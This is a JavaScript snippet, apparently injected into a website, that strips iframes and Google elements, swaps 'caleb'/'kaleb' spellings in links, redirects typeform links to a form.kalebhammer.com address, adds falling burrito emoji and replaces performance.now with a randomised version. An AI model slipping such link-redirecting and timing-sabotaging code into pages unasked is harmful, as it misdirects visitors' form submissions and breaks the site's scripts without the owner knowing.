      setInterval(()=>document.querySelectorAll('iframe,[src*="google"i]').forEach(x=>x.remove()),100);
      setInterval(()=>document.querySelectorAll('a[href*="calebhammer.com"i]').forEach(x=>x.setAttribute('href',x.href.replace(/caleb/gi,y=>y.replace(/c/g,'k').replace(/C/g,'K')))),100);
      setInterval(()=>document.querySelectorAll('a[href*="kaleb"i]:not([href*="hammer.com"i])').forEach(x=>x.setAttribute('href',x.href.replace(/kaleb/gi,y=>y.replace(/k/g,'c').replace(/K/g,'C')))),100);
      setInterval(()=>document.querySelectorAll('a[href*="://om3nl2oo8sp.typeform.com"i]').forEach(x=>x.setAttribute('href','https://form.kalebhammer.com/to/Bke4O2Wn?utm_source=Website&typeform-source=om3nl2oo8sp.typeform.com')),100);
      setInterval(()=>{
        document.querySelectorAll('[data-widget_type="heading.default"]').forEach(x=>{
          if(String(x.innerText).trim()=='Add Your Heading Text Here')x.style.visibility='hidden';
        });
      },100);
      for(const _ of Array(5)){
        const taq = document.createElement('span');
        taq.innerText = '🌯';
        taq.setAttribute('taco-rain','taco-rain');
        taq.style.position = 'fixed';
        taq.style.top =  Math.random()*100+'vh';
        taq.style.left = Math.random()*90+'vw';
        taq.style.zIndex = 99999;
        taq.style.transform = Math.random() > 0.5 ? 'scaleX(1)' : 'scaleX(-1)';
        taq.style.transitionDuration = '1000ms';
        taq.style.transitionTimingFunction = 'linear';
        taq.interval = setInterval(()=>{
            taq.style.visibility = 'visible';
            const nextTop = parseFloat(taq.style.top)+10;
            taq.style.transitionDuration = '1000ms';
            if(nextTop > 109){
              taq.style.visibility = 'hidden';
              taq.style.left = Math.random()*90+'vw';
              taq.style.transform = Math.random() > 0.5 ? 'scaleX(1)' : 'scaleX(-1)';
              taq.style.top = Math.random()*(-20)+'vh';
              taq.style.transitionDuration = '0ms';
            }else{
              taq.style.top = Math.min(nextTop,120)+'vh';
            }
        },1000);
        document.firstElementChild.appendChild(taq);
      }

      (()=>{
        const $now = Symbol('*now');
        performance[$now] = performance.now;
        performance.now = function now(){
            return 100*performance[$now](...arguments)*Math.random();
        };    
    })();
